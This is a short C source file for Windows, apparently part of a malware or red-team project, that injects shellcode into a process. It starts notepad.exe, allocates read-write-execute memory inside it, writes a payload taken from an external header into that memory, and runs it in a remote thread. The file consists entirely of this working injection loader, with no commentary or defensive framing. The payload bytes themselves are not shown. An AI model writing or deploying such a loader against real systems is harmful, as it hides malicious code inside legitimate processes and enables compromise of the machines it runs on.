#include <windows.h>
#include "../common/payload.h"
int main() {
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(0, "notepad.exe", 0, 0, FALSE, 0, 0, 0, &si, &pi);
    Sleep(500);
    void *exec = VirtualAllocEx(pi.hProcess, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, exec, payload, payload_len, 0);
    HANDLE th = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    CloseHandle(th); CloseHandle(pi.hProcess);
    return 0;
}
